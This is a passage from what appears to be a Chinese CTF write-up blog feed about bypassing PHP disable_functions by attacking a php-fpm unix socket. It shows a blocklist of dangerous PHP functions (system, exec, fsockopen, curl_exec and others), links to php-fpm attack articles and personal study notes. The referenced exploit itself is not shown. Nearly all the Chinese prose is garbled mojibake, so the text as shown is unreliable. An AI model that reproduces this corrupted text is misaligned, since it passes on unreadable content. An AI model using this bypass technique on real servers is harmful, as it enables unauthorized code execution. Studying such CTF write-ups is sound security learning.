&lt;pre tabindex="0">&lt;code>file_get_contents,file_put_contents,fwrite,file,chmod,chown,copy,link,fflush,mkdir,popen,rename,touch,unlink,pcntl_alarm,move_upload_file,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,fsockopen,pfsockopen,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,curl_init,curl_exec,curl_multi_init,curl_multi_exec,dba_open,dba_popen,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,dl,putenv
&lt;/code>&lt;/pre>&lt;p>è€ƒè™‘ç”¨&lt;code>create_function&lt;/code>æ¥rceï¼Œä¸è¿‡è¿˜æ˜¯ç»•ä¸è¿‡disable_functionsæ¥æ‰§è¡Œ/readflag&lt;/p>
&lt;p>ä¸è¿‡è·‘ä¸€ä¸‹ç»™å‡ºçš„dockerï¼Œå¯ä»¥çœ‹åˆ°ç”¨unix socketæ¨¡å¼è¿è¡Œçš„php-fpm&lt;/p>
&lt;p>é¢˜ç›®ç¯å¢ƒå®‰è£…äº†apacheæœåŠ¡å™¨å’Œapache-moduleæ¨¡å¼çš„phpæ¨¡å—ï¼ˆè¿™ä¸ªå°±æ˜¯é¢˜ç›®ç¯å¢ƒï¼‰ï¼Œä½†æ˜¯fpmä¹Ÿå®‰è£…äº†å¹¶ä¸”å¯åŠ¨&lt;/p>
&lt;p>fpmæ¨¡å¼çš„php.iniä¸phpinfoä¸­æ˜¾ç¤ºçš„ä¸åŒï¼Œæ˜¯ç‹¬ç«‹çš„ï¼Œdisable_funtcionsçš„é™åˆ¶å®½æ¾å¾ˆå¤šï¼Œæˆ‘ä»¬æ¥æ‰“å®ƒæ¥rceï¼Œexpå°±æ˜¯ä¸Šé¢é‚£ä¸ª&lt;/p>
&lt;hr>
&lt;p>æ‹–æ‹–æ‹‰æ‹‰å››äº”å¤©ï¼Œæ€»ç®—æ˜¯æŠ½ç©ºç»™æ€»ç»“å®Œäº†ï¼Œå¯¹åšé¢˜å’Œå­¦ä¹ æ–¹é¢åˆæœ‰äº†ä¸€äº›èˆ¹æ–°çš„ç†è§£ï¼Œè¿˜æ˜¯æœ‰å¾ˆå¤šæ”¶è·çš„&lt;/p>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://blog.csdn.net/shreck66/article/details/50355729">fastcgiåè®®åˆ†æä¸å®ä¾‹&lt;/a> | &lt;a href="https://www.kancloud.cn/digest/php-src/136260">php-fpm ä¸ Nginxä¼˜åŒ–æ€»ç»“&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://evoa.me/archives/6/">PHP è¿æ¥æ–¹å¼ &amp;amp; PHP-FPMæœªæˆæƒè®¿é—®æ¼æ´ &amp;amp; *CTF echohub&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://xz.aliyun.com/t/5598">æµ…æphp-fpmçš„æ”»å‡»æ–¹å¼&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgiåè®®åˆ†æ &amp;amp;&amp;amp; PHP-FPMæœªæˆæƒè®¿é—®æ¼æ´ &amp;amp;&amp;amp; Expç¼–å†™&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mp.weixin.qq.com/s/LP_vfBx3M512P0rYdMMWOA">ã€æŠ€æœ¯åˆ†äº«ã€‘æ·±å…¥ FTP æ”»å‡» php-fpm ç»•è¿‡ disable_functions&lt;/a>&lt;/p>
&lt;/details>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä¸€ç‚¹å¯¹è¿‘å†µçš„ç¢ç¢å¿µ
&lt;/h4>
&lt;/summary>
&lt;p>æœ€è¿‘æœ‰ç‚¹è‡ªé—­ï¼Œçœ‹ç€é‚£ä¹ˆå¤šå’Œæˆ‘å­¦ä¹ æ—¶é—´å·®ä¸å¤šçš„å¸ˆå‚…éƒ½å·²ç»ç›¸å½“ç›¸å½“å‰å®³äº†ï¼Œæˆ‘è¿˜æ˜¯è·Ÿåˆšå¼€å§‹ä¸€æ ·èœï¼Œæ»¡æ‰“æ»¡ç®—å­¦äº†ä¹ŸåŠå¹´å¤šäº†ï¼Œæ€ä¹ˆå°±è¿™ä¹ˆèœå‘¢ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿå·®è·å¤ªå¤§äº†ï¼Œä»–å¦ˆçš„å°±æ˜¯èœå•Š&lt;/p>
&lt;p>çœ‹çœ‹åˆ«äººåšå®¢éƒ½å†™å¾—å•¥ï¼Œcveå¤ç°ï¼Œæ¼æ´æŒ–æ˜ï¼Œæ¸—é€å®æˆ˜ï¼Œå®‰å…¨ç ”ç©¶ï¼Œæˆ‘å‘¢ï¼Ÿå…¨æ˜¯äº’è”ç½‘æ¹¿åƒåœ¾ï¼Œæ²¡ä¸€ç‚¹å«é‡‘é‡ï¼Œå°±ä¼šå†™ä¸€ç‚¹wpï¼Œè¿˜å¤§å¤šéƒ½æ˜¯å‚è€ƒäº†åˆ«äººçš„å†…å®¹ï¼Œç„¶åå†™ä¸€ç‚¹çŸ¥è¯†æ€»ç»“ï¼Œè·Ÿä¸ªå°å­¦ç”Ÿä¸€æ ·&lt;/p>
&lt;p>è¿™å‘¨ä¸‹äº†å†³å¿ƒæŠŠæ²¡ç”¨çš„è¯¾çš„å‡è¯·æ‰äº†ï¼Œå¸Œæœ›è‡ªå·±èƒ½å¥½å¥½åˆ©ç”¨èµ·æ¥ï¼Œåˆ«æ‘†äº†ï¼ŒçœŸåˆ«æ‘†äº†ï¼Œè¦å‡ºå¤§é—®é¢˜&lt;/p>
&lt;p>ä¸è¿‡æ€»ç»“æ˜¯å¾ˆæœ‰å¿…è¦çš„ï¼Œç°åœ¨çš„è¿›åº¦æ˜¯è¿™æ ·ï¼š&lt;/p>
&lt;ul>
&lt;li>phpååºåˆ—åŒ–ï¼šç¼º åŸç”Ÿç±»çš„å­¦ä¹ +è·Ÿä¸€äº›å®é™…çš„é“¾å­&lt;/li>
&lt;li>pythonååºåˆ—åŒ–ï¼šå®Œ&lt;/li>
&lt;li>sqliï¼šå·®ä¸å¤šå®Œï¼Œè¿˜å¾—å¤šåšç‚¹é¢˜åŠ æ·±ç†è§£&lt;/li>
&lt;li>SSTIï¼šå®Œ&lt;/li>
&lt;li>æ–‡ä»¶ä¸Šä¼ ï¼šä¹‹å‰9æœˆæ€»ç»“åˆ°ä¸€åŠå»æ‰“hvväº†&lt;/li>
&lt;li>php-fpmï¼šå®Œ&lt;/li>
&lt;li>GraphQLï¼šå®Œ&lt;/li>
&lt;/ul>
&lt;p>å¾ˆè–„å¼±çš„åœ°æ–¹éƒ½è¿˜æ²¡æŒæ¡ï¼ˆè¿™ä¸æ˜¯åºŸè¯ï¼‰ï¼Œå‡ ä¸ªæ€¥éœ€æ€»ç»“æŒæ¡çš„ï¼š&lt;/p>
&lt;ul>
&lt;li>ssrfï¼šä¸ç†Ÿç»ƒ&lt;/li>
&lt;li>xssï¼šåšé¢˜é‡åˆ°éƒ½æ˜¯èº²ç€èµ°&lt;/li>
&lt;li>jsåœ†å½¢æ±¡æŸ“ï¼šè·Ÿä¸Šé¢é‚£ä¸ªæ€»æ˜¯ä¸€èµ·å‡ºç°&lt;/li>
&lt;li>xxe&lt;/li>
&lt;li>xsleaks&lt;/li>
&lt;/ul>
&lt;p>è¿˜æœ‰javaï¼Œè¿™ä¸ªå¿…é¡»å¾—å­¦&lt;/p>
&lt;p>ä¸å¤šè¯´äº†ï¼Œå†²ï¼ï¼ï¼&lt;/p>
&lt;/details></description></item></channel></rss>